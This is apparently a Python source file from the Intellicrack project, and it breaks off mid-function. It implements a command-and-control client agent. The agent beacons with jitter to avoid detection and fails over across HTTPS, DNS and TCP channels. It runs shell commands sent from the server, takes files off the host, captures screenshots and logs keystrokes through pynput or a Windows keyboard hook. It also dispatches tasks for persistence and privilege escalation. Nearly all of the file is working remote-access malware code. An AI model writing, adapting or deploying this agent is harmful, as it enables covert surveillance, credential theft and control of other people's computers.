"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import asyncio
import json
import logging
import os
import platform
import queue
import random
import shutil
import socket
import struct
import sys
import time
from typing import Any

from intellicrack.handlers.psutil_handler import psutil
from intellicrack.utils.service_utils import get_service_url

from .base_c2 import BaseC2

"""
C2 Client Implementation

Client-side C2 agent with multi-protocol support, encryption,
and autonomous operation capabilities.
"""

# Windows API constants for keylogging
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
HC_ACTION = 0


class C2Client(BaseC2):
    """Advanced C2 client agent with autonomous operation,
    multi-protocol fallback, and stealth capabilities.
    """

    def __init__(self, config: dict[str, Any]):
        """Initialize the C2 client agent."""
        self.config = config
        self.logger = logging.getLogger("IntellicrackLogger.C2Client")

        # Client configuration
        c2_url = get_service_url("c2_server")
        default_host = c2_url.replace("http://", "").replace("https://", "").split(":")[0]
        default_port = int(c2_url.split(":")[-1].replace("/", "")) if ":" in c2_url else 8888

        self.server_host = config.get("server_host", os.environ.get("C2_SERVER_HOST", default_host))
        self.server_port = config.get("server_port", int(os.environ.get("C2_SERVER_PORT", str(default_port))))
        self.protocol = config.get("protocol", "https")
        self.encryption_key = config.get("encryption_key")
        self.client_id = config.get("client_id", self._generate_client_id())

        # Connection management
        self.connection = None
        self.connected = False
        self.last_heartbeat = 0
        self.heartbeat_interval = config.get("heartbeat_interval", 30)  # seconds
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = config.get("max_reconnect_attempts", 5)

        # Command execution
        self.command_queue = queue.Queue()
        self.result_queue = queue.Queue()
        self.running = False
        self.worker_thread = None

        # Security features
        self.use_encryption = config.get("use_encryption", True)
        self.verify_ssl = config.get("verify_ssl", False)
        self.user_agent = config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

        # Stealth features
        self.jitter_enabled = config.get("jitter_enabled", True)
        self.sleep_time = config.get("sleep_time", 1.0)
        self.max_jitter = config.get("max_jitter", 0.3)

        # Statistics
        self.commands_executed = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        self.session_start_time = time.time()

        # Initialize encryption if enabled
        if self.use_encryption and self.encryption_key:
            self._setup_encryption()

        self.logger.info(f"C2 client initialized for {self.server_host}:{self.server_port}")

    def _initialize_protocols(self):
        """Initialize communication protocols in order of preference."""
        protocols_config = []
        protocol_configs = self.config.get("protocols", {})

        # HTTPS Protocol (primary)
        if protocol_configs.get("https_enabled", True):
            https_config = protocol_configs.get("https", {})
            c2_url = get_service_url("c2_server")
            default_host = c2_url.replace("http://", "").replace("https://", "").split(":")[0]
            protocols_config.append(
                {
                    "type": "https",
                    "server_url": f"https://{https_config.get('host', os.environ.get('C2_HTTPS_HOST', default_host))}:{https_config.get('port', int(os.environ.get('C2_HTTPS_PORT', '443')))}",
                    "headers": https_config.get("headers", {}),
                    "priority": 1,
                }
            )

        # DNS Protocol (backup)
        if protocol_configs.get("dns_enabled", False):
            dns_config = protocol_configs.get("dns", {})
            c2_url = get_service_url("c2_server")
            default_host = c2_url.replace("http://", "").replace("https://", "").split(":")[0]
            protocols_config.append(
                {
                    "type": "dns",
                    "domain": dns_config.get("domain", os.environ.get("DNS_DOMAIN", "internal.local")),
                    "dns_server": f"{dns_config.get('host', os.environ.get('C2_DNS_HOST', default_host))}:{dns_config.get('port', int(os.environ.get('C2_DNS_PORT', '53')))}",
                    "priority": 2,
                }
            )

        # TCP Protocol (fallback)
        if protocol_configs.get("tcp_enabled", False):
            tcp_config = protocol_configs.get("tcp", {})
            c2_url = get_service_url("c2_server")
            default_host = c2_url.replace("http://", "").replace("https://", "").split(":")[0]
            default_port = int(c2_url.split(":")[-1].replace("/", "")) if ":" in c2_url else 4444
            protocols_config.append(
                {
                    "type": "tcp",
                    "host": tcp_config.get("host", os.environ.get("C2_TCP_HOST", default_host)),
                    "port": tcp_config.get("port", int(os.environ.get("C2_TCP_PORT", str(default_port)))),
                    "priority": 3,
                }
            )

        # Use base class method
        self.initialize_protocols(protocols_config, self.encryption_manager)

    async def start(self):
        """Start the C2 client and begin autonomous operation."""
        try:
            # Use base class start preparation
            if not self.prepare_start("C2 client"):
                return

            # Establish initial connection
            await self._establish_connection()

            # Start main operation loop
            await self._main_operation_loop()

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Failed to start C2 client: {e}")
            await self.stop()
            raise

    async def stop(self):
        """Stop the C2 client and cleanup resources."""
        try:
            self.logger.info("Stopping C2 client...")
            self.running = False

            # Disconnect from current protocol
            if self.current_protocol:
                try:
                    await self.current_protocol["handler"].disconnect()
                except (
                    OSError,
                    ConnectionError,
                    TimeoutError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    json.JSONDecodeError,
                ) as e:
                    self.logger.error(f"Error disconnecting: {e}")

            self.logger.info("C2 client stopped successfully")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Error stopping C2 client: {e}")

    async def _establish_connection(self):
        """Establish connection using available protocols."""
        for protocol in self.protocols:
            try:
                self.logger.info(f"Attempting connection via {protocol['name']}")

                handler = protocol["handler"]
                success = await handler.connect()

                if success:
                    self.current_protocol = protocol
                    self.session_id = await self._register_with_server()

                    if self.session_id:
                        self.logger.info(f"Successfully connected via {protocol['name']}")
                        return

            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.warning(f"Failed to connect via {protocol['name']}: {e}")
                self.stats["protocol_failures"] += 1

        raise Exception("Failed to establish connection with any protocol")

    async def _register_with_server(self) -> str | None:
        """Register with C2 server and get session ID."""
        try:
            # Gather initial system information
            system_info = await self._gather_system_info()

            registration_data = {
                "type": "registration",
                "data": {
                    "client_version": "1.0.0",
                    "system_info": system_info,
                    "capabilities": self._get_capabilities(),
                    "config": {
                        "beacon_interval": self.beacon_interval,
                        "auto_gather_info": self.auto_gather_info,
                    },
                },
            }

            response = await self.current_protocol["handler"].send_message(registration_data)

            if response and response.get("status") == "success":
                session_id = response.get("session_id")
                self.logger.info(f"Registered with server, session ID: {session_id}")
                return session_id
            self.logger.error("Server registration failed")
            return None

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Registration failed: {e}")
            return None

    async def _main_operation_loop(self):
        """Main operation loop with beacon and task processing."""
        consecutive_failures = 0

        while self.running:
            try:
                # Calculate next beacon time with jitter
                beacon_time = self._calculate_beacon_time()

                # Send beacon and check for tasks
                success = await self._send_beacon()

                if success:
                    consecutive_failures = 0
                    self.stats["last_checkin"] = time.time()

                    # Process any pending tasks
                    await self._process_pending_tasks()

                    # Perform autonomous activities
                    await self._perform_autonomous_activities()

                else:
                    consecutive_failures += 1
                    self.logger.warning(f"Beacon failed, consecutive failures: {consecutive_failures}")

                    # Attempt protocol failover after multiple failures
                    if consecutive_failures >= self.max_retries:
                        await self._attempt_protocol_failover()
                        consecutive_failures = 0

                # Wait until next beacon time
                await asyncio.sleep(beacon_time)

            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error(f"Error in main operation loop: {e}")
                await asyncio.sleep(30)  # Brief pause before retry

    async def _send_beacon(self) -> bool:
        """Send beacon to C2 server."""
        try:
            beacon_data = {
                "type": "beacon",
                "session_id": self.session_id,
                "data": {
                    "timestamp": time.time(),
                    "status": "active",
                    "stats": self.stats,
                    "pending_task_count": len(self.pending_tasks),
                    "system_status": await self._get_system_status(),
                },
            }

            response = await self.current_protocol["handler"].send_message(beacon_data)

            if response:
                # Process server response
                await self._process_server_response(response)
                return True
            return False

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Beacon failed: {e}")
            return False

    async def _process_server_response(self, response: dict[str, Any]):
        """Process response from server."""
        try:
            response_type = response.get("type", "unknown")

            if response_type == "tasks":
                # New tasks from server
                tasks = response.get("tasks", [])
                self.pending_tasks.extend(tasks)
                self.stats["total_tasks"] += len(tasks)
                self.logger.info(f"Received {len(tasks)} new tasks")

            elif response_type == "config_update":
                # Configuration update
                new_config = response.get("config", {})
                await self._update_config(new_config)

            elif response_type == "command":
                # Direct command execution
                command = response.get("command", {})
                await self._execute_direct_command(command)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Error processing server response: {e}")

    async def _process_pending_tasks(self):
        """Process pending tasks from server."""
        while self.pending_tasks and self.running:
            task = self.pending_tasks.pop(0)
            try:
                self.logger.info(f"Executing task: {task.get('type', 'unknown')}")
                result = await self._execute_task(task)

                # Send task result back to server
                await self._send_task_result(task["task_id"], result, True)
                self.stats["successful_tasks"] += 1

            except (
                OSError,
                ConnectionError,
                TimeoutError,
                AttributeError,
                ValueError,
                TypeError,
                RuntimeError,
                json.JSONDecodeError,
            ) as e:
                self.logger.error(f"Task execution failed: {e}")
                await self._send_task_result(task["task_id"], str(e), False)
                self.stats["failed_tasks"] += 1

    async def _execute_task(self, task: dict[str, Any]) -> Any:
        """Execute a specific task."""
        task_type = task.get("type", "unknown")
        task_data = task.get("data", {})

        if task_type == "shell_command":
            return await self._execute_shell_command(task_data.get("command", ""))
        if task_type == "file_download":
            return await self._download_file(task_data.get("remote_path", ""))
        if task_type == "file_upload":
            return await self._upload_file(task_data.get("local_path", ""), task_data.get("data", b""))
        if task_type == "screenshot":
            return await self._take_screenshot()
        if task_type == "keylog_start":
            return await self._start_keylogging()
        if task_type == "keylog_stop":
            return await self._stop_keylogging()
        if task_type == "process_list":
            return await self._get_process_list()
        if task_type == "system_info":
            return await self._gather_system_info()
        if task_type == "network_scan":
            return await self._network_scan(task_data.get("target", ""))
        if task_type == "persistence_install":
            return await self._install_persistence(task_data)
        if task_type == "privilege_escalation":
            return await self._attempt_privilege_escalation(task_data)
        raise ValueError(f"Unknown task type: {task_type}")

    async def _send_task_result(self, task_id: str, result: Any, success: bool):
        """Send task execution result back to server."""
        try:
            result_data = {
                "type": "task_result",
                "session_id": self.session_id,
                "task_id": task_id,
                "result": result,
                "success": success,
                "timestamp": time.time(),
            }

            await self.current_protocol["handler"].send_message(result_data)

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Failed to send task result: {e}")

    async def _perform_autonomous_activities(self):
        """Perform autonomous intelligence gathering activities based on real triggers."""
        try:
            current_time = time.time()

            if self.auto_gather_info:
                # Gather system information based on real triggers
                if await self._should_gather_info(current_time):
                    await self._autonomous_info_gathering()

            if self.auto_screenshot:
                # Take screenshots based on real events
                if await self._should_take_screenshot(current_time):
                    await self._autonomous_screenshot()

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Error in autonomous activities: {e}")

    async def _should_gather_info(self, current_time: float) -> bool:
        """Determine if system info should be gathered based on real triggers."""
        # Check time-based trigger (every 10 minutes)
        if not hasattr(self, "_last_info_gather"):
            self._last_info_gather = 0

        if current_time - self._last_info_gather > 600:  # 10 minutes
            self._last_info_gather = current_time
            return True

        # Check system change triggers
        try:
            # Check if new processes started
            current_processes = len(psutil.pids())
            if not hasattr(self, "_last_process_count"):
                self._last_process_count = current_processes

            if abs(current_processes - self._last_process_count) > 5:
                self._last_process_count = current_processes
                self._last_info_gather = current_time
                return True

            # Check CPU usage spike
            cpu_percent = psutil.cpu_percent(interval=0.1)
            if cpu_percent > 80:
                self._last_info_gather = current_time
                return True

            # Check for new network connections
            connections = len(psutil.net_connections())
            if not hasattr(self, "_last_connection_count"):
                self._last_connection_count = connections

            if abs(connections - self._last_connection_count) > 10:
                self._last_connection_count = connections
                self._last_info_gather = current_time
                return True

        except Exception as e:
            self.logger.debug(f"Failed to check system info trigger: {e}")

        return False

    async def _should_take_screenshot(self, current_time: float) -> bool:
        """Determine if screenshot should be taken based on real events."""
        # Check time-based trigger (every 30 minutes)
        if not hasattr(self, "_last_screenshot"):
            self._last_screenshot = 0

        if current_time - self._last_screenshot > 1800:  # 30 minutes
            self._last_screenshot = current_time
            return True

        # Check for user activity
        try:
            # Check if active window changed
            if sys.platform == "win32":
                import win32gui

                current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

                if not hasattr(self, "_last_active_window"):
                    self._last_active_window = current_window

                if current_window != self._last_active_window:
                    self._last_active_window = current_window
                    self._last_screenshot = current_time
                    return True

            # Check for significant screen changes (using basic metrics)
            # This would require more sophisticated screen monitoring in production

        except Exception as e:
            self.logger.debug(f"Failed to check screenshot trigger: {e}")

        return False

    async def _calculate_beacon_time(self) -> float:
        """Calculate next beacon time with jitter."""
        jitter = random.uniform(-self.jitter_percent / 100, self.jitter_percent / 100)  # noqa: S311 - Timing jitter for anti-detection
        beacon_time = self.beacon_interval * (1 + jitter)
        return max(beacon_time, 5)  # Minimum 5 seconds

    async def _attempt_protocol_failover(self):
        """Attempt to failover to a different protocol."""
        try:
            self.logger.info("Attempting protocol failover...")

            # Try each protocol except the current one
            for protocol in self.protocols:
                if protocol == self.current_protocol:
                    continue

                try:
                    handler = protocol["handler"]
                    success = await handler.connect()

                    if success:
                        # Disconnect from old protocol
                        if self.current_protocol:
                            await self.current_protocol["handler"].disconnect()

                        self.current_protocol = protocol
                        self.logger.info(f"Successfully failed over to {protocol['name']}")
                        return

                except (
                    OSError,
                    ConnectionError,
                    TimeoutError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                    json.JSONDecodeError,
                ) as e:
                    self.logger.warning(f"Failover to {protocol['name']} failed: {e}")

            self.logger.error("All protocol failover attempts failed")

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(f"Error during protocol failover: {e}")  # Task execution methods

    async def _execute_shell_command(self, command: str) -> str:
        """Execute shell command and return output."""
        import subprocess

        try:
            import shlex

            # Parse command safely
            if isinstance(command, str):
                cmd_args = shlex.split(command)
            else:
                cmd_args = command

            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                cmd_args,
                check=False,
                shell=False,
                capture_output=True,
                text=True,
                timeout=30,
            )
            return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
        except ImportError as e:
            self.logger.error("Import error in c2_client.py: %s", e)
            return "Command execution failed: shlex import error"
        except subprocess.TimeoutExpired as e:
            self.logger.error("subprocess.TimeoutExpired in c2_client.py: %s", e)
            return "Command timed out after 30 seconds"
        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return f"Command execution failed: {e}"

    async def _download_file(self, remote_path: str) -> dict[str, Any]:
        """Download file from target system."""
        try:
            import base64

            if os.path.exists(remote_path):
                with open(remote_path, "rb") as f:
                    file_data = f.read()

                return {
                    "success": True,
                    "filename": os.path.basename(remote_path),
                    "size": len(file_data),
                    "data": base64.b64encode(file_data).decode("utf-8"),
                }
            return {"success": False, "error": "File not found"}

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _upload_file(self, local_path: str, file_data: bytes) -> dict[str, Any]:
        """Upload file to target system."""
        try:
            import base64

            # Decode base64 data if needed
            if isinstance(file_data, str):
                file_data = base64.b64decode(file_data)

            with open(local_path, "wb") as f:
                f.write(file_data)

            return {
                "success": True,
                "path": local_path,
                "size": len(file_data),
            }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _take_screenshot(self) -> dict[str, Any]:
        """Take screenshot of current screen."""
        try:
            import base64

            # Try multiple screenshot methods for cross-platform compatibility
            screenshot_data = None
            screenshot_method = None

            # Method 1: PIL/Pillow (preferred)
            try:
                import io

                from PIL import ImageGrab

                screenshot = ImageGrab.grab()
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format="PNG")
                screenshot_data = img_buffer.getvalue()
                screenshot_method = "PIL"

            except ImportError as e:
                self.logger.error("Import error in c2_client.py: %s", e)
                # Method 2: PyQt6 screenshot
                try:
                    import sys

                    from intellicrack.handlers.pyqt6_handler import QApplication

                    app = QApplication.instance()
                    if app is None:
                        app = QApplication(sys.argv)

                    screen = app.primaryScreen()
                    screenshot = screen.grabWindow(0)

                    # Convert to bytes
                    import io

                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="PNG")
                    screenshot_data = buffer.getvalue()
                    screenshot_method = "PyQt6"

                except ImportError as e:
                    self.logger.error("Import error in c2_client.py: %s", e)
                    # Method 3: System-specific commands
                    import subprocess
                    import tempfile

                    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp_file:
                        temp_path = temp_file.name

                    try:
                        if os.name == "nt":  # Windows
                            # Use PowerShell for Windows screenshot
                            ps_command = f"""
                            Add-Type -AssemblyName System.Windows.Forms
                            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                            $bitmap.Save("{temp_path}", [System.Drawing.Imaging.ImageFormat]::Png)
                            $graphics.Dispose()
                            $bitmap.Dispose()
                            """
                            subprocess.run(["powershell", "-Command", ps_command], check=True)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603, S607
                        else:  # Linux/Unix
                            # Try different screenshot tools
                            screenshot_tools = [
                                ["scrot", temp_path],
                                ["gnome-screenshot", "-f", temp_path],
                                ["import", "-window", "root", temp_path],  # ImageMagick
                                ["xwd", "-root", "-out", temp_path],
                            ]

                            for tool in screenshot_tools:
                                try:
                                    subprocess.run(tool, check=True, stderr=subprocess.DEVNULL)  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    break
                                except (subprocess.CalledProcessError, FileNotFoundError) as e:
                                    self.logger.error(
                                        "(subprocess.CalledProcessError, FileNotFoundError) in c2_client.py: %s",
                                        e,
                                    )
                                    continue

                        # Read screenshot data
                        if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                            with open(temp_path, "rb") as f:
                                screenshot_data = f.read()
                            screenshot_method = "system_command"

                    finally:
                        if os.path.exists(temp_path):
                            os.unlink(temp_path)

            if screenshot_data:
                # Calculate dimensions (basic estimation)
                width, height = 1920, 1080  # Default fallback
                try:
                    if screenshot_method == "PIL":
                        width, height = screenshot.size
                    elif screenshot_method == "PyQt6":
                        width, height = screenshot.width(), screenshot.height()
                except Exception:
                    self.logger.debug("Error getting screenshot dimensions")

                return {
                    "success": True,
                    "timestamp": time.time(),
                    "method": screenshot_method,
                    "width": width,
                    "height": height,
                    "size": len(screenshot_data),
                    "data": base64.b64encode(screenshot_data).decode("utf-8"),
                }
            return {
                "success": False,
                "error": "No screenshot method available or screenshot capture failed",
            }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _start_keylogging(self) -> dict[str, Any]:
        """Start keylogging functionality."""
        try:
            # Check if keylogging is already running
            if hasattr(self, "_keylogger_active") and self._keylogger_active:
                return {
                    "success": False,
                    "error": "Keylogging is already active",
                }

            # Initialize keylogger state
            self._keylogger_active = False
            self._keylog_buffer = []
            self._keylogger_thread = None

            # Try different keylogging methods
            try:
                # Method 1: pynput (cross-platform)
                from pynput import keyboard

                def on_key_press(key):
                    try:
                        if hasattr(key, "char") and key.char:
                            self._keylog_buffer.append(
                                {
                                    "type": "char",
                                    "key": key.char,
                                    "timestamp": time.time(),
                                }
                            )
                        else:
                            key_name = str(key).replace("Key.", "")
                            self._keylog_buffer.append(
                                {
                                    "type": "special",
                                    "key": key_name,
                                    "timestamp": time.time(),
                                }
                            )

                        # Limit buffer size
                        if len(self._keylog_buffer) > 10000:
                            self._keylog_buffer = self._keylog_buffer[-5000:]

                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as e:
                        self.logger.debug(f"Keylog capture error: {e}")

                # Start listener in separate thread
                self._keylogger_listener = keyboard.Listener(on_press=on_key_press)
                self._keylogger_listener.start()
                self._keylogger_active = True

                return {
                    "success": True,
                    "message": "Keylogging started with pynput",
                    "method": "pynput",
                    "timestamp": time.time(),
                }

            except ImportError:
                # Method 2: Windows-specific using ctypes
                if os.name == "nt":
                    try:
                        import ctypes
                        import threading

                        try:
                            from ctypes import wintypes

                            # Ensure required types are available
                            if not hasattr(wintypes, "WPARAM"):
                                wintypes.WPARAM = ctypes.c_ulong
                            if not hasattr(wintypes, "LPARAM"):
                                wintypes.LPARAM = ctypes.c_long
                            if not hasattr(wintypes, "HANDLE"):
                                wintypes.HANDLE = ctypes.c_void_p
                            if not hasattr(wintypes, "MSG"):

                                class MSG(ctypes.Structure):
                                    """Windows MSG structure for message handling."""

                                    _fields_ = [
                                        ("hwnd", ctypes.c_void_p),
                                        ("message", ctypes.c_uint),
                                        ("wParam", ctypes.c_ulong),
                                        ("lParam", ctypes.c_long),
                                        ("time", ctypes.c_ulong),
                                        ("pt_x", ctypes.c_long),
                                        ("pt_y", ctypes.c_long),
                                    ]

                                wintypes.MSG = MSG
                        except (ImportError, AttributeError) as e:
                            self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)

                            # Fallback Windows types for cross-platform compatibility
                            class FallbackWintypes:
                                """Fallback Windows types for cross-platform compatibility."""

                                WPARAM = ctypes.c_ulong
                                LPARAM = ctypes.c_long
                                HANDLE = ctypes.c_void_p

                                class MSG(ctypes.Structure):
                                    """Fallback MSG structure definition."""

                                    _fields_ = [
                                        ("hwnd", ctypes.c_void_p),
                                        ("message", ctypes.c_uint),
                                        ("wParam", ctypes.c_ulong),
                                        ("lParam", ctypes.c_long),
                                        ("time", ctypes.c_ulong),
                                        ("pt_x", ctypes.c_long),
                                        ("pt_y", ctypes.c_long),
                                    ]

                            from types import SimpleNamespace

                            wintypes = SimpleNamespace()
                            wintypes.WPARAM = FallbackWintypes.WPARAM
                            wintypes.LPARAM = FallbackWintypes.LPARAM
                            wintypes.HANDLE = FallbackWintypes.HANDLE
                            wintypes.MSG = FallbackWintypes.MSG

                        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
                        user32 = ctypes.WinDLL("user32", use_last_error=True)

                        # Hook procedure
                        hookproc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

                        def low_level_keyboard_proc(nCode, wParam, lParam):
                            if nCode == HC_ACTION and wParam == WM_KEYDOWN:
                                try:
                                    # Get virtual key code
                                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value & 0xFFFFFFFF

                                    # Convert to character if possible
                                    key_char = None
                                    if 32 <= vk_code <= 126:  # Printable ASCII
                                        key_char = chr(vk_code)

                                    self._keylog_buffer.append(
                                        {
                                            "type": "vk_code",
                                            "vk_code": vk_code,
                                            "char": key_char,
                                            "timestamp": time.time(),
                                        }
                                    )

                                    # Limit buffer size
                                    if len(self._keylog_buffer) > 10000:
                                        self._keylog_buffer = self._keylog_buffer[-5000:]

                                except (
                                    OSError,
                                    ConnectionError,
                                    TimeoutError,
                                    AttributeError,
                                    ValueError,
                                    TypeError,
                                    RuntimeError,
                                    json.JSONDecodeError,
                                ) as e:
                                    self.logger.debug(f"Windows keylog error: {e}")

                            return user32.CallNextHookEx(None, nCode, wParam, lParam)

                        # Install hook
                        self._hook_proc = hookproc(low_level_keyboard_proc)
                        self._hook_id = user32.SetWindowsHookExW(
                            WH_KEYBOARD_LL,
                            self._hook_proc,
                            kernel32.GetModuleHandleW(None),
                            0,
                        )

                        if self._hook_id:
                            self._keylogger_active = True

                            # Start message loop in separate thread
                            def message_loop():
                                try:
                                    msg = wintypes.MSG()
                                    while self._keylogger_active:
                                        ret = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                                        if ret == 0 or ret == -1:  # WM_QUIT or error
                                            break
                                        user32.TranslateMessage(ctypes.byref(msg))
                                        user32.DispatchMessageW(ctypes.byref(msg))
                                except (
                                    OSError,
                                    ConnectionError,
                                    TimeoutError,
                                    AttributeError,
                                    ValueError,
                                    TypeError,
                                    RuntimeError,
                                    json.JSONDecodeError,
                                ) as e:
                                    self.logger.debug(f"Message loop error: {e}")

                            self._keylogger_thread = threading.Thread(target=message_loop)
                            self._keylogger_thread.daemon = True
                            self._keylogger_thread.start()

                            return {
                                "success": True,
                                "message": "Keylogging started with Windows API",
                                "method": "windows_api",
                                "timestamp": time.time(),
                            }
                        return {
                            "success": False,
                            "error": "Failed to install Windows keyboard hook",
                        }

                    except (
                        OSError,
                        ConnectionError,
                        TimeoutError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                        json.JSONDecodeError,
                    ) as windows_error:
                        return {
                            "success": False,
                            "error": f"Windows keylogging failed: {windows_error}",
                        }
                else:
                    return {
                        "success": False,
                        "error": "No keylogging method available for this platform",
                    }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _stop_keylogging(self) -> dict[str, Any]:
        """Stop keylogging functionality."""
        try:
            if not hasattr(self, "_keylogger_active") or not self._keylogger_active:
                return {
                    "success": False,
                    "error": "Keylogging is not active",
                }

            # Stop keylogger
            self._keylogger_active = False

            # Stop pynput listener
            if hasattr(self, "_keylogger_listener"):
                try:
                    self._keylogger_listener.stop()
                    del self._keylogger_listener
                except Exception:
                    self.logger.debug("Error stopping keylogger listener")

            # Unhook Windows API
            if hasattr(self, "_hook_id") and os.name == "nt":
                try:
                    import ctypes

                    user32 = ctypes.WinDLL("user32")
                    user32.UnhookWindowsHookEx(self._hook_id)
                    del self._hook_id
                    del self._hook_proc
                except Exception:
                    self.logger.debug("Error unhooking Windows API")

            # Get captured keylog data
            captured_keys = len(getattr(self, "_keylog_buffer", []))

            return {
                "success": True,
                "message": "Keylogging stopped",
                "captured_keys": captured_keys,
                "timestamp": time.time(),
            }

        except (
            OSError,
            ConnectionError,
            TimeoutError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            json.JSONDecodeError,
        ) as e:
            self.logger.error(
                "(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s",
                e,
            )
            return {"success": False, "error": str(e)}

    async def _get_process_list(self) -> list[dict[str, Any]]:
        """Get list of running processes."""
        try:
            from intellicrack.handlers.psutil_handler import psutil

            processes = []

            for proc in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    self.logger.error("(psutil.NoSuchProcess, psutil.AccessDenied) in c2_client.py: %s", e)

            return processes

        except ImportError as e:
            self.logger.error("Import error in c2_client.py: %s", e)
            # Fallback without psutil
            import subprocess

            try:
                if os.name == "nt":
                    tasklist_path = shutil.which("tasklist")
                    if tasklist_path:
                        result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            [tasklist_path],
                            check=False,
                            capture_output=True,
                            text=True,
